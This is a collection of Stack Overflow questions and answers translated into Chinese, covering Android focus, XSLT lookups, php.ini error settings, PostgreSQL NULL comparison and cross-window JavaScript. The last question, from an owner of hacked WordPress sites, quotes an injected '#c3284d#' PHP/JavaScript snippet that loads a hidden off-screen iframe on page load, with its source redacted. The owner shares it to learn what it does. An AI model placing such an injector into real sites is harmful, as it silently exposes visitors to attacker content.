                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical" >

                <TextView
                    style="?android:attr/textAppearanceSmall"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:text="@string/key"
                    android:textColor="#ff000000"
                    android:textStyle="bold" />

                <Spinner
                    android:id="@+id/edit_key"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:imeOptions="actionNext"
                    android:textColor="#ff000000" />
            </LinearLayout>

            <LinearLayout
                android:id="@+id/depreciated_area"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <CheckBox
                    android:id="@+id/depreciated"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="@string/depreciated"
                    android:textColor="#ff000000"
                    android:textStyle="bold" />
            </LinearLayout>
        </LinearLayout>
    </ScrollView>

    <LinearLayout
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:orientation="horizontal"
        android:paddingBottom="1.0dip"
        android:paddingLeft="4.0dip"
        android:paddingRight="4.0dip"
        android:paddingTop="5.0dip" >

        <Button
            android:id="@+id/btnsave"
            android:layout_width="0.0dip"
            android:layout_height="fill_parent"
            android:layout_weight="1.0"
            android:text="@string/save" />

        <Button
            android:id="@+id/btncancel"
            android:layout_width="0.0dip"
            android:layout_height="fill_parent"
            android:layout_weight="1.0"
            android:text="@string/cancel" />
    </LinearLayout>

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T00:54:17.913

用于`requestFocus`将焦点集中到特定的`EditText`：

```
 <EditText
                android:id="@+id/edit_songname"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:imeOptions="actionNext"
                android:inputType="textCapSentences"
                android:textColor="#ff000000" >

                <requestFocus />

            </EditText> 
```

正如您在布局中看到的那样，该`tempo`字段是其中包含的字段`requestFocus`。只要把它移到你的`songname`领域，一切都会好起来的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T01:29:40.450

在Java中只需添加这个

```
myedittext.requestFocus(); 
```

# algorithm - Frederickson的堆选择算法简单解释

> ID：12014892
> 
> 赞同：6
> 
> 时间：2012-08-18T00:51:38.240
> 
> 标签：algorithm, data-structures, heap, min-heap

弗雷德里克森的堆选择算法是否有任何简单的解释，可以在在线任何地方可用的最小堆中找到 O(k) 时间内排名第 k 的元素？如果没有，任何人都可以解释算法的核心吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T01:22:41.873

尝试谷歌搜索“弗雷德里克森堆选择”。

[http://160592857366.free.fr/joe/ebooks/ShareData/An%20Optimal%20Algorithm%20for%20Selection%20in%20a%20Min-Heap.pdf](http://160592857366.free.fr/joe/ebooks/ShareData/An%20Optimal%20Algorithm%20for%20Selection%20in%20a%20Min-Heap.pdf)

# xml - XSL 使用当前上下文 ID pt 2 在 xml 树中查找其他节点值

> ID：12014896
> 
> 赞同：-1
> 
> 时间：2012-08-18T00:52:41.360
> 
> 标签：xml, xslt

这是一个稍微更新的问题，最初发布在此处：[XSL - Find another nodes value using the value of the current context](https://stackoverflow.com/questions/11998907/xsl-finding-another-nodes-value-using-the-value-of-the-current-context)。我有一个 XML，它使用 PackageID 值来引用文档中的其他节点。

我想为每个具有“拉斯塔”操作值的 CompositionPackage 创建一个 for-each 循环。注意：一个 CompositionPackage 可以有多个 Match。我想使用当前节点的结果然后在文档中查找包含返回的 PackageID 值的另一个节点的值。在这种情况下，我想获取 SourcePackage/PackageName 或 MaterialPackage/PackageName 或另一个具有与 CompositionPackage/PackageTracks/TimelineTrack/TrackSegment/SourcePackageID 中找到的 PackageID 值匹配的 PackageID 值的值。

示例 XML：

```
<AAG version="1.1">
<Preface>
  <ContentStorage>
      <SourcePackage>
        <PackageTracks>
          <TimelineTrack>
            <TrackSegment>
                <ComponentLength>5066</ComponentLength>
            </TrackSegment>
          </TimelineTrack>
        </PackageTracks>
        <PackageName>Name001</PackageName>
        <PackageID>urn:44f70006</PackageID>
      </SourcePackage>
      <MaterialPackage>
        <PackageTracks>
          <TimelineTrack>
            <TrackSegment>
            <ComponentLength>804</ComponentLength>
            </TrackSegment>
          </TimelineTrack>
        </PackageTracks>
        <PackageName>Name010</PackageName>
        <PackageID>urn:44f70008</PackageID>
      </MaterialPackage>
      <CompositionPackage>
        <PackageTracks>
          <TimelineTrack>
            <TrackSegment>
                <Operation>Rasta</Operation>
                <SourcePackageID>urn:44f70006</SourcePackageID>
                <ComponentLength>10099</ComponentLength>
            </TrackSegment>
          </TimelineTrack>
          <TimelineTrack>
            <TrackSegment>
                <Operation>NotRasta</Operation>
                <SourcePackageID>urn:44f70007</SourcePackageID>
                <ComponentLength>100</ComponentLength>
            </TrackSegment>
          <TimelineTrack>
            <TrackSegment>
                <Operation>Rasta</Operation>
                <SourcePackageID>urn:44f70008</SourcePackageID>
                <ComponentLength>200</ComponentLength>
            </TrackSegment>
          </TimelineTrack>
          </TimelineTrack>
        </PackageTracks>
        <PackageName>NameABC</PackageName>
        <PackageID>urn:ce1904fd</PackageID>
      </CompositionPackage>
      <CompositionPackage>
        <PackageTracks>
          <TimelineTrack>
            <TrackSegment>
                <Operation>Rasta</Operation>
                <SourcePackageID>urn:00f70009</SourcePackageID>
                <ComponentLength>222</ComponentLength>
            </TrackSegment>
          </TimelineTrack>
        </PackageTracks>
        <PackageName>NameABC</PackageName>
        <PackageID>urn:ff1603fd</PackageID>
      </CompositionPackage>
      <CompositionPackage>
        <PackageTracks>
          <TimelineTrack>
            <TrackSegment>
                <Operation>Rasta</Operation>
                <SourcePackageID>urn:11f80008</SourcePackageID>
                <ComponentLength>444</ComponentLength>
            </TrackSegment>
          </TimelineTrack>
        </PackageTracks>
        <PackageName>NameBCD</PackageName>
        <PackageID>urn:gg1702fj</PackageID>
      </CompositionPackage>
      <CompositionPackage>
        <PackageTracks>
          <TimelineTrack>
            <TrackSegment>
                <Operation>Rasta</Operation>
                <SourcePackageID>urn:22f90009</SourcePackageID>
                <ComponentLength>555</ComponentLength>
            </TrackSegment>
          </TimelineTrack>
        </PackageTracks>
        <PackageName>NameXYZ</PackageName>
        <PackageID>urn:11f80010</PackageID>
      </CompositionPackage>
      <CompositionPackage>
        <PackageTracks>
          <TimelineTrack>
            <TrackSegment>
                <Operation>NotRasta</Operation>
                <SourcePackageID>urn:22f90009</SourcePackageID>
                <ComponentLength>555</ComponentLength>
            </TrackSegment>
          </TimelineTrack>
        </PackageTracks>
        <PackageName>NameWWW</PackageName>
        <PackageID>urn:11f80008</PackageID>
      </CompositionPackage>
      <MaterialPackage>
        <PackageTracks>
          <TimelineTrack>
            <TrackSegment>
            <ComponentLength>864</ComponentLength>
            </TrackSegment>
          </TimelineTrack>
        </PackageTracks>
        <PackageName>Name008</PackageName>
        <PackageID>urn:00f70009</PackageID>
      </MaterialPackage>
      <MaterialPackage>
        <PackageTracks>
          <TimelineTrack>
            <TrackSegment>
            <ComponentLength>864</ComponentLength>
            </TrackSegment>
          </TimelineTrack>
        </PackageTracks>
        <PackageName>Name002</PackageName>
        <PackageID>urn:22f70009</PackageID>
      </MaterialPackage>
  </ContentStorage>
</Preface>
</AAG> 
```

示例 XSL：

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="no" indent="yes"/>
<xsl:strip-space elements="*"/>

<xsl:template match="@*|node()">
<xsl:copy>
<xsl:apply-templates select="@*|node()"/>
</xsl:copy>
</xsl:template>

 <xsl:template match = "AAG">
 <Master>
 <xsl:for-each select="AAG/Preface/ContentStorage/CompositionPackage/PackageTracks/TimelineTrack/TrackSegment/Operation"> <!--whose Operation value is 'Rasta' -->
 <newnode>
   <value1><xsl:value-of select ="CompositionPackage/PackageTracks/TimelineTrack/TrackSegment/ComponentLength"/></value1>
   <value2><xsl:value-of select ="CompositionPackage/PackageTracks/TimelineTrack/TrackSegment/SourcePackageID"/></value2>
   <value3><xsl:value-of select ="CompositionPackage/PackageTracks/TimelineTrack/TrackSegment[SourcePackageID=current()/MaterialPackage/PackageName"/></value3>
 </newnode>
 </xsl:for-each>
 </Master>
 </xsl:template>
 </xsl:stylesheet> 
```

预期的 XML：

```
<Master>
<newnode>
  <Value1>1099</Value1>
  <Value2>urn:44f70006</Value2>
  <Value3>Name001</Value3>
</newnode>
<newnode>
  <Value1>200</Value1>
  <Value2>urn:44f70008</Value2>
  <Value3>Name010</Value3>
</newnode>
<newnode>
  <Value1>222</Value1>
  <Value2>urn:00f70009</Value2>
  <Value3>Name008</Value3>
</newnode>
<newnode>
  <Value1>444</Value1>
  <Value2>urn:11f80008</Value2>
  <Value3>NameWWW</Value3>
</newnode>
<newnode>
  <Value1>555</Value1>
  <Value2>urn:22f90009</Value2>
  <Value3>Name002</Value3>
</newnode>
</Master> 
```

我的 Current XSL 正在为所有 value3 元素返回 ""。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T02:30:06.273

**错误很明显**：在

```
<xsl:for-each select=
"AAG
  /Preface
    /ContentStorage
      /CompositionPackage
         /PackageTracks/TimelineTrack/TrackSegment/Operation"> 
```

**你有**：

```
<xsl:value-of select =
 "CompositionPackage/PackageTracks/TimelineTrack/TrackSegment/ComponentLength"/> 
```

**由于一个`Operation`元素没有任何子`CompositionPackage`元素（实际上根本没有任何元素子元素），因此上面没有选择任何内容，也没有任何内容输出**。

`xsl:value-of`正文中的其他两条指令的情况完全相同`xsl:for-each`

**提供的 XML 文档与想要的结果之间存在矛盾，并且存在数据错误**：

1.  没有任何`PackageID`值为“urn:22f90009”的元素。因此，在最后`newnode`提供的结果中，`Value3`必须为空——但在提供的结果中，它有一个非空字符串值。

2.  在源 XML 文档中有嵌套`TimelineTrack`元素。

**这些问题解释了为什么我提出的转换不能完全产生想要的结果**：

```
<xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
      <xsl:output method="xml" omit-xml-declaration="yes" indent="yes"/>
      <xsl:strip-space elements="*"/>

      <xsl:template match="@*|node()">
            <xsl:copy>
              <xsl:apply-templates select="@*|node()"/>
            </xsl:copy>
      </xsl:template>

      <xsl:template match = "AAG">
       <Master>
         <xsl:for-each select=
         "Preface
           /ContentStorage
            /CompositionPackage
               /PackageTracks
                 /TimelineTrack
                   /TrackSegment[Operation='Rasta']
         ">
             <newnode>
               <value1>
                  <xsl:value-of select="ComponentLength"/>
               </value1>
               <value2>
                 <xsl:value-of select="SourcePackageID"/>
           </value2>
               <value3>
                 <xsl:value-of select=
                  "../../../../*[self::SourcePackage
                       or self::MaterialPackage
                       or self::CompositionPackage]
                                    [PackageID
                                    =
                                    current()/SourcePackageID
                                    ]
                                    /PackageName
                     "/>
               </value3>
             </newnode>
       </xsl:for-each>
      </Master>
      </xsl:template>
</xsl:stylesheet> 
```

**当此转换应用于提供的 XML 文档时**：

```
<AAG version="1.1">
    <Preface>
        <ContentStorage>
            <SourcePackage>
                <PackageTracks>
                    <TimelineTrack>
                        <TrackSegment>
                            <ComponentLength>5066</ComponentLength>
                        </TrackSegment>
                    </TimelineTrack>
                </PackageTracks>
                <PackageName>Name001</PackageName>
                <PackageID>urn:44f70006</PackageID>
            </SourcePackage>
            <MaterialPackage>
                <PackageTracks>
                    <TimelineTrack>
                        <TrackSegment>
                            <ComponentLength>804</ComponentLength>
                        </TrackSegment>
                    </TimelineTrack>
                </PackageTracks>
                <PackageName>Name010</PackageName>
                <PackageID>urn:44f70008</PackageID>
            </MaterialPackage>
            <CompositionPackage>
                <PackageTracks>
                    <TimelineTrack>
                        <TrackSegment>
                            <Operation>Rasta</Operation>
                            <SourcePackageID>urn:44f70006</SourcePackageID>
                            <ComponentLength>10099</ComponentLength>
                        </TrackSegment>
                    </TimelineTrack>
                    <TimelineTrack>
                        <TrackSegment>
                            <Operation>NotRasta</Operation>
                            <SourcePackageID>urn:44f70007</SourcePackageID>
                            <ComponentLength>100</ComponentLength>
                        </TrackSegment>
                        <TimelineTrack>
                            <TrackSegment>
                                <Operation>Rasta</Operation>
                                <SourcePackageID>urn:44f70008</SourcePackageID>
                                <ComponentLength>200</ComponentLength>
                            </TrackSegment>
                        </TimelineTrack>
                    </TimelineTrack>
                </PackageTracks>
                <PackageName>NameABC</PackageName>
                <PackageID>urn:ce1904fd</PackageID>
            </CompositionPackage>
            <CompositionPackage>
                <PackageTracks>
                    <TimelineTrack>
                        <TrackSegment>
                            <Operation>Rasta</Operation>
                            <SourcePackageID>urn:00f70009</SourcePackageID>
                            <ComponentLength>222</ComponentLength>
                        </TrackSegment>
                    </TimelineTrack>
                </PackageTracks>
                <PackageName>NameABC</PackageName>
                <PackageID>urn:ff1603fd</PackageID>
            </CompositionPackage>
            <CompositionPackage>
                <PackageTracks>
                    <TimelineTrack>
                        <TrackSegment>
                            <Operation>Rasta</Operation>
                            <SourcePackageID>urn:11f80008</SourcePackageID>
                            <ComponentLength>444</ComponentLength>
                        </TrackSegment>
                    </TimelineTrack>
                </PackageTracks>
                <PackageName>NameBCD</PackageName>
                <PackageID>urn:gg1702fj</PackageID>
            </CompositionPackage>
            <CompositionPackage>
                <PackageTracks>
                    <TimelineTrack>
                        <TrackSegment>
                            <Operation>Rasta</Operation>
                            <SourcePackageID>urn:22f90009</SourcePackageID>
                            <ComponentLength>555</ComponentLength>
                        </TrackSegment>
                    </TimelineTrack>
                </PackageTracks>
                <PackageName>NameXYZ</PackageName>
                <PackageID>urn:11f80010</PackageID>
            </CompositionPackage>
            <CompositionPackage>
                <PackageTracks>
                    <TimelineTrack>
                        <TrackSegment>
                            <Operation>NotRasta</Operation>
                            <SourcePackageID>urn:22f90009</SourcePackageID>
                            <ComponentLength>555</ComponentLength>
                        </TrackSegment>
                    </TimelineTrack>
                </PackageTracks>
                <PackageName>NameWWW</PackageName>
                <PackageID>urn:11f80008</PackageID>
            </CompositionPackage>
            <MaterialPackage>
                <PackageTracks>
                    <TimelineTrack>
                        <TrackSegment>
                            <ComponentLength>864</ComponentLength>
                        </TrackSegment>
                    </TimelineTrack>
                </PackageTracks>
                <PackageName>Name008</PackageName>
                <PackageID>urn:00f70009</PackageID>
            </MaterialPackage>
            <MaterialPackage>
                <PackageTracks>
                    <TimelineTrack>
                        <TrackSegment>
                            <ComponentLength>864</ComponentLength>
                        </TrackSegment>
                    </TimelineTrack>
                </PackageTracks>
                <PackageName>Name002</PackageName>
                <PackageID>urn:22f70009</PackageID>
            </MaterialPackage>
        </ContentStorage>
    </Preface>
</AAG> 
```

**产生以下结果：**

```
<Master>
    <newnode>
        <value1>10099</value1>
        <value2>urn:44f70006</value2>
        <value3>Name001</value3>
    </newnode>
    <newnode>
        <value1>222</value1>
        <value2>urn:00f70009</value2>
        <value3>Name008</value3>
    </newnode>
    <newnode>
        <value1>444</value1>
        <value2>urn:11f80008</value2>
        <value3>NameWWW</value3>
    </newnode>
    <newnode>
        <value1>555</value1>
        <value2>urn:22f90009</value2>
        <value3></value3>
    </newnode>
</Master> 
```

# postgresql - 在 php.ini 中打开 error_reporting 会杀死我的 pg 模块

> ID：12014899
> 
> 赞同：0
> 
> 时间：2012-08-18T00:53:18.157
> 
> 标签：postgresql, error-handling, php, pg

我有一个问题，最近我不得不从 MySQL 切换到 PostgreSQL，因为有一个新客户端。

这是我的错误在我的设置中的方式`php.ini`：

```
display_errors
Default Value: On
Development Value: On
Production Value: Off

; display_startup_errors
;   Default Value: Off
;   Development Value: On
;   Production Value: Off

; error_reporting
;   Default Value: E_ALL & ~E_NOTICE
;   Development Value: E_ALL | E_STRICT
;   Production Value: E_ALL & ~E_DEPRECATED 
```

该`pg`dll 正在加载并且运行良好。

Pg 出现在我的`phpinfo()`; 世界很美好。

然后我需要打开错误，因为我需要它进行调试。

我当然这样做了：

```
display_errors
Default Value: On
Development Value: On
Production Value: Off

; display_startup_errors
;   Default Value: Off
;   Development Value: On
;   Production Value: Off

; error_reporting
   Default Value: E_ALL & ~E_NOTICE
   Development Value: E_ALL | E_STRICT
;   Production Value: E_ALL & ~E_DEPRECATED 
```

...但是现在`pg`模块不会加载并且`pg`扩展名没有出现在我的`phpinfo()`.

什么？

有任何想法吗？这是关于什么的？

**更新**

所以我已经纠正了我`php.ini`的样子：

```
display_errors= On
;   Default Value: On
;   Development Value: On
;   Production Value: Off

; display_startup_errors
;   Default Value: Off
;   Development Value: On
;   Production Value: Off

error_reporting = E_ALL & ~E_NOTICE
;   Default Value: E_ALL & ~E_NOTICE
;   Development Value: E_ALL | E_STRICT
;   Production Value: E_ALL & ~E_DEPRECATED 
```

pgsql 加载但仍然不喜欢错误报告。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T00:57:57.957

嗯，应该是：

```
error_reporting = E_ALL & ~E_NOTICE 
```

其他的事情是关于不同类型环境的建议值的 jsut 注释`ini`总是

`key_name = value`

这些块是文件中的文档......如果您在文件中搜索指令并逐步查看结果，您将在文件后面找到实际设置，因此不在该部分之前：

```
;;;;;;;;;;;;;;;;;;;
; Quick Reference ;
;;;;;;;;;;;;;;;;;;;
; The following are all the settings which are different in either the production
; or development versions of the INIs with respect to PHP's default behavior.
; Please see the actual settings later in the document for more details as to why
; we recommend these changes in PHP's behavior. 
```

# postgresql - 选择具有空比较的项目

> ID：12014902
> 
> 赞同：1
> 
> 时间：2012-08-18T00:53:48.333
> 
> 标签：postgresql, psycopg2

我没有使用完整的 DB 抽象库，而是在 psycopg2 中使用如下所示的原始 sql 模板：

```
 SELECT id FROM table WHERE message = %(message)s ; 
```

检索我的预期结果的理想查询如下所示：

```
 SELECT id FROM table WHERE message = 'a3cbb207' ;
 SELECT id FROM table WHERE message IS NULL ; 
```

不幸的是......明显的问题是我的 NULL 比较结果如下所示：

```
 SELECT id FROM table WHERE message = NULL ; 
```

...这不是正确的比较-并且没有给我预期的结果集。

我的实际查询比上图复杂得多——所以我不能轻易更改它们。（这将是正确的解决方案，我同意。我现在正在寻找紧急解决方案）

有谁知道解决方法，所以我可以保持相同的单一模板，直到适当的修复到位？我试图去`coalesce`和/或`cast`工作，但我的尝试失败了。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-18T01:52:29.257

你想要的是[`IS NOT DISTINCT FROM`](http://www.postgresql.org/docs/current/static/functions-comparison.html).

```
SELECT id FROM table WHERE message IS NOT DISTINCT FROM 'the text';

SELECT id FROM table WHERE message IS NOT DISTINCT FROM NULL; 
```

`NULL IS NOT DISTINCT FROM NULL`is `true`， not `NULL`，所以它就像`=`但具有不同的`NULL`比较语义。触发功能很棒。

不过， AFAIK 不能`IS DISTINCT FROM`用于索引查找，所以要小心。对 null 和 value 使用单独的测试会更好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T00:59:27.773

不幸的是，`NULL`实际上并不等于任何东西（甚至不等于另一个`NULL`），因为 的值`NULL`旨在表示一个*unknown*。您最好的选择是更改您的模板以正确处理此问题。

如果您可以在模板中为左右操作数传入单独的值，则仍然使用等号的一种方法是：

```
SELECT id FROM table WHERE true = (message is null); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-18T01:06:41.257

您可以尝试如下编写查询子句：

```
WHERE message = %(message)s OR ((%message)s IS NULL AND message IS NULL)) 
```

这有点粗略，但它的意思是“选择与我的参数匹配的消息，或者如果我的参数为空，则选择所有为空的消息”。它应该可以解决问题。

# google-maps-markers - 使用 Directions 服务时使用 jQuery/gmap3 获取标记列表

> ID：12014907
> 
> 赞同：2
> 
> 时间：2012-08-18T00:54:39.057
> 
> 标签：google-maps-markers, directions, jquery-gmap3

我今天开始使用 gmap3 jQuery 插件，但在获取标记列表时遇到了问题。只要我手动添加所有标记（使用 addMarker 或 addMarkers），一切正常，并且：

```
.gmap3({action:'get', name:'marker', all:true}); 
```

给出正确的标记列表。

但是，如果我使用 action:getRoute 和 addDirectionsRenderer - 上面粘贴的代码不能“获取”标记。

我用于显示方向的代码如下 - 它可以正常工作并在地图上正确显示。唯一的问题是我无法从中获取任何标记，因此我可以在创建后处理它们。

```
var optionDirections = {
        origin: startcoord,
        destination: stopcoord,
        waypoints: coordsAllGoogleStyle,
        optimizeWaypoints: true,
        travelMode: google.maps.DirectionsTravelMode.DRIVING
};
....
.gmap3({
    action:'getRoute',
    options: optionDirections,
    callback: function(results) {
        if (!results) { alert('nodata'); return; }
        $(this).gmap3(
            {
                action:'addDirectionsRenderer',
                options:{
                    preserveViewport: false,
                    draggable: false,
                    directions:results
                }
            }
        );
        var res = $(this).gmap3({action:'get', name:'marker', all:true});
        alert('Found: '+res.length+' markers');
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-04-20T06:35:46.250

为了简单起见，我联系了这个 api 的作者，它不再支持它，因为“现在人们使用 angular”

不错是不是...

# javascript - 我可以在两个 javascript 文件之间传递一个字符串吗？

> ID：12014919
> 
> 赞同：-5
> 
> 时间：2012-08-18T00:55:45.620
> 
> 标签：javascript

是否可以将字符串从一个 .js 传递到另一个 .js 文件？例如，main.html 包含 javascript。我需要将一个字符串从 main.html 传递到另一个 HTML 文件，该文件在运行时加载一个 javascript 文件。这可能吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T01:03:00.670

如果您正在加载一个全新的页面（page1.html），则不可能将变量直接从一个 JS 文件传递​​到另一个（如果您在两个 html 页面中加载完全相同的 JS 文件，也不可能）。

但是你为什么不把你的绳子塞进饼干里呢？根据您必须迎合的浏览器，您还可以选择 localStorage/SessionStorage。最后但同样重要的是，始终可以选择在您的请求 URL (page1.html?mystring=foo) 中传递一个变量，然后通过 Javascript 访问它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-18T01:14:32.857

您可以更改指向下一页的链接的 href 以添加查询字符串。从那里您的 javascript 可以获取正在使用的 URL，解析您传递的值并使用您想要的值进行初始化。

通常这可以通过引用 window.location 来完成，但您也可以添加一个元素，然后您的新页面的 URL 看起来像[http://www.yourdomain.com/page2.html?query_parameter=your_desired_string](http://wwww.yourdomain.com/page2.html?query_parameter=your_desired_string) 大多数现代浏览器如果输入字段与查询字符串参数具有相同的名称，我的经验将自动填充它。从那里，您在第二页上的 javascript 可以从隐藏的输入元素中获取值，以获取您想要从一页到下一页的字符串。

如果您使用 + 符号可能会有一些困难，我已经看到一些浏览器在遇到 URL 时将 + 解释为空格。在将您想要的字符串发送到查询字符串之前，您必须转义 + 以获得真正的 +。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-18T02:58:23.100

我只需将值放入 cookie 中并引用该值来初始化第二个 javascript 文件中的字符串。

# javascript - 如何跨窗口传递事件，可能吗？

> ID：12014923
> 
> 赞同：2
> 
> 时间：2012-08-18T00:57:40.737
> 
> 标签：javascript, jquery, web

我想实现以下 UI 效果，非常感谢您的帮助或提示。

1）当一个链接被点击时，一个窗口会弹出到它的一侧（最好是相对于链接的位置而不是固定的）。该链接指向一个基于 php 的 URL。

2) 弹出窗口应该与原始窗口有一些“关系”或相同的“名称空间”，例如传递鼠标事件、跨窗口“滚动到”等。

它在 div 中是可行的，我只是不确定在不同的窗口中是否也是如此。我什至找不到可以尝试的东西。

我不是 jQuery 或网页设计方面的专家，所以请给我足够详细的建议，让我开始。非常感谢。

* * *

关于答案...

首先，谢谢！我目前正在测试“opener”......当我这样做时，我想知道是否可以引用来自不同窗口的对象。例如下面的代码，

```
function mse_over()
{
  $('#'+object).css('border', '2px ridge brown');
} 
```

它只是改变对象的边框颜色。

我的问题是在子窗口中，如果对象在父窗口中可以做到（反之亦然）。一种可行的方法可能是从孩子那里调用“mse_over”。但是是否可以跨窗口直接访问对象？谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T01:07:31.710

如果通过链接打开一个窗口，那么管理从子级到父级以及反向的内容当然是可行的。

您需要将子窗口分配给 javascript 对象。此示例打开一个新窗口，然后更改窗口的标题：

```
child_window = window.open('test.php');

$(child_window.document).ready(function () {
  $(child_window.document).contents().find('#title').html('New title');
}); 
```

同样，您可以通过将 window.opener 分配给对象来管理父级：

```
parent_window = window.opener 
```

这是核心 javascript，jQuery 只是让一些选择器和页面操作更容易一些。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T01:18:41.843

是的，有可能。您可以使用[window.opener](http://www.w3schools.com/jsref/prop_win_parent.asp) window.opener 是一个变量，用于保存打开当前窗口的窗口的窗口对象。

在我的示例中，我假设您使用的是 jQuery。没有必要使用 jQuery，但我正在使用它来抽象出浏览器的差异。

您可以在主窗口中执行此操作：

```
window.onChildWindowClick = function(e){
    //do stuff with click event
} 
```

现在在弹出窗口中

```
$("#element-in-popup").click(function(e){
    window.opener.onChildWindowClick(e);
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-18T01:01:16.480

[http://www.w3.org/TR/webmessaging/#web-messaging](http://www.w3.org/TR/webmessaging/#web-messaging) & [http://www.w3schools.com/jsref/prop_win_opener.asp](http://www.w3schools.com/jsref/prop_win_opener.asp) 可以帮助你。

跨文档消息传递允许您在窗口之间传递事件。但是，不允许跨站点脚本。

对于父窗口：

```
var event = function() {...};
childw = window.open(...); 
```

对于子窗口：

```
window.opener.func(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-06-29T21:08:28.393

可能性还包括使用“localStorage”。只要“来源”相同，并且浏览器来自同一供应商，它就可以工作。

在一个窗口中，创建一个事件监听器：

`window.addEventListener('storage', function(e) {...`

在另一个窗口中，通过 localStorage 添加或更改某些内容：

`localStorage.setItem("key", "value");`

您会发现，如果您尝试将现有项目设置为与以前相同的值，则事件将（据我所见）不会被触发。

我在[https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API找到了说明](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API)

# vb.net - 将 My.Settings 变量重置为默认值

> ID：12014924
> 
> 赞同：3
> 
> 时间：2012-08-18T00:57:47.267
> 
> 标签：vb.net, my.settings

如何重置我在调试应用程序期间更改的 my.settings 变量？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-18T01:18:38.600

恢复到默认值：

[我的.Settings.Reset()](http://msdn.microsoft.com/en-us/library/system.configuration.applicationsettingsbase.reset%28v=vs.100%29)

# ruby-on-rails-3 - Rails 3 + 设计 2 + JsonP / 回调

> ID：12014927
> 
> 赞同：1
> 
> 时间：2012-08-18T00:58:59.643
> 
> 标签：ruby-on-rails-3, devise, jsonp

我正在开发一个使用 REST api 和 json 与 rails3 服务器通信的 PhoneGap 移动应用程序。使用设计 2.0.4 完成身份验证。对于我自己的控制器，我可以指定 rails 应该使用回调包装 json，以通过以下方式处理跨域问题：

```
respond_to do |format|
      format.html # index.html.erb
      format.json { render :json => @books, :callback => params[:callback] }
end 
```

注意：

```
:callback => params[:callback] 
```

我无法用设计控制器做到这一点。我怎样才能设计出响应 js 请求 - 即带有回调的 json？

非常感谢，

爱丽儿

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:34:33.100

最好覆盖为渲染器提供 :callback 参数或以某种方式使用 before_filter 的设计控制器。为了做到这一点，将设计控制器从 github/local-gem-directory 复制到您的应用程序，然后进行编辑。但是为每个动作定义一个 JS 视图会容易得多：

如果你还没有完成它已经开始生成设计视图（这不是必需的，但会帮助你理解这个想法）：

```
rails g device:views -s 
```

`*.html.erb`它会在您的文件夹中生成大量`app/views/devise`文件。`*.js.erb`您必须使用以下内容在它们旁边创建适当的：

```
<%=render :inline => params[:callback]+'('+resource.to_json+')'%> 
```

**PS：**实际上你可以把那行放进去`app/views/application.js.erb`，跳过其他步骤；）

# javascript - javascript - 自动关闭标签

> ID：12014932
> 
> 赞同：0
> 
> 时间：2012-08-18T00:59:48.993
> 
> 标签：javascript

我想在弹出的“谢谢”消失后关闭当前的浏览器选项卡。

```
<script language='javascript'>
alert('Thank you.'); 
window.close();
</script> 
```

但它没有用，仍然是白色的空白屏幕。怎么让白屏自动关闭？？？

请帮忙。

注：支持所有网络浏览器。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T01:12:08.403

如果要关闭执行 javascript 的窗口，请使用`self.close()`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T01:13:27.280

当窗口不是由脚本打开时，某些浏览器不允许 javascript 自动关闭窗口。关闭需要由用户交互引导。如果您的代码不起作用，可能是因为它

# php - 在 WordPress 网站上被黑 这是做什么#c3284d#

> ID：12014934
> 
> 赞同：1
> 
> 时间：2012-08-18T01:00:09.607
> 
> 标签：php, linux, wordpress, apache, ftp

> **可能重复：**
> [清理感染 c3284d 病毒的服务器，使用搜索和替换](https://stackoverflow.com/questions/11490744/clean-server-infected-with-c3284d-virus-using-search-and-replace)

今天在我的几个网站上发现了这个脚本，我知道这个脚本是做什么的，但是散列出来的东西是做什么的？它会影响 ftp 工具吗？我无法下载包含内容的文件？这是服务器端的问题吗？我使用的主题是 Dynamix，该主题中是否存在已知漏洞，或者我认为它是我的主机是否正确？为什么文件无法通过 ftp 下载或编辑？

```
#c3284d#
echo "<script type=\"text/javascript\">
function frmAdd() {
var ifrm = document.createElement('iframe');
ifrm.style.position='absolute';
ifrm.style.top='-999em';
ifrm.style.left='-999em';
ifrm.src  = \"***redacted***\";
ifrm.id = 'frmId';
document.body.appendChild(ifrm);
 };
 window.onload = frmAdd;
 </script>
";
 #/c3284d# 
```

我有网站的备份，所以我对搜索和替换所有内容不感兴趣！因为就像用户说的清理一个错误，还有更多的错误出现！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T01:03:59.557

